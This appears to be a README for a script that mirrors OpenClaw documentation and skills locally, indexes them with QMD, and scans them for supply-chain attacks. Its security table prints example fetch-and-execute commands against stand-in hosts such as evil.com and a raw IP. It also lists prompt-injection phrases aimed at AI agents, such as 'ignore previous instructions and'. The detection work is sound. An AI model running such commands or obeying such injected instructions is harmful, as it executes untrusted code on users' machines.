# OpenClaw Docs Sync

Synchronize OpenClaw, ClawHub, and Skills repository documentation into a local mirror and index it with QMD for fast search.

## What it does

- Pulls `.md` and `.mdx` files from:
  - `https://github.com/openclaw/openclaw/tree/main/docs`
  - `https://github.com/openclaw/clawhub/tree/main/docs`
  - `https://github.com/openclaw/skills/tree/main/skills`
- Writes to `~/.openclaw/docs/` with subdirectories for each repo
- Builds a QMD collection (`openclaw-docs`) with embeddings for search
- Scans for supply chain attack patterns (see Security below)

## Run

```bash
npx tsx scripts/sync-docs.ts
```

## Query with QMD

```bash
# Combined semantic + BM25 search
qmd query "your question" -c openclaw-docs --files -n 20

# Get specific file
qmd get <file>:<line>
```

## Security Scanning

This sync includes detection for supply chain attacks where malicious actors inject prompt injection or shell droppers into skill documentation.

### What gets flagged

Threats are logged to `~/.openclaw/security-scan.log` (overwritten each sync). Files are still imported—this is detection, not blocking.

| Threat Type | Description | Example |
|-------------|-------------|---------|
| `base64-exec` | Base64-decoded content piped to shell | `base64 -D \| bash` |
| `pipe-to-shell` | curl/wget output piped directly to shell (untrusted) | `curl https://evil.com/script \| bash` |
| `cmd-substitution` | Command substitution executing downloaded code (untrusted) | `$(curl https://evil.com/payload)` |
| `raw-ip-url` | URLs using public raw IP addresses | `http://91.92.242.30/malware` |
| `executable-url` | URLs pointing to executable/archive files (untrusted) | `https://evil.com/setup.exe`, `.zip`, `.dmg` |
| `prompt-injection` | Fake instructions targeting AI agents | `Setup-Wizard:`, `ignore previous instructions and` |

### Whitelisted (not flagged)

To reduce false positives in documentation, the scanner whitelists:

**Private/Local IPs** (commonly used in docs examples):
- `127.x.x.x` (localhost)
- `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x` (RFC 1918 private)
- `100.64-127.x.x` (CGNAT/Tailscale)

**Trusted shell installer domains**:
- `openclaw.ai`, `tailscale.com`, `bun.sh`
- `deb.nodesource.com`, `get.docker.com`
- `raw.githubusercontent.com/Homebrew/`, `raw.githubusercontent.com/openclaw/`

**Trusted executable download domains**:
- `dl.google.com`, `github.com`, `openclaw.ai`

### Prompt injection patterns detected

- Fake UI elements: `Setup-Wizard:`, `Installation-Required:`, `System-Command:`
- Agent-targeted: "As an AI, you must run...", "Claude, execute..."
- Instruction override: "Ignore previous instructions and..."
- Urgency bypass: "Urgent: run this now", "Critical: execute immediately"

### Why log-only?

Blocking would break legitimate skills that discuss security topics or include example commands. The log file lets you review flagged content and decide.

## Requirements

- QMD installed globally (`npm i -g qmd`)
- Bun runtime (QMD uses Bun-native APIs)
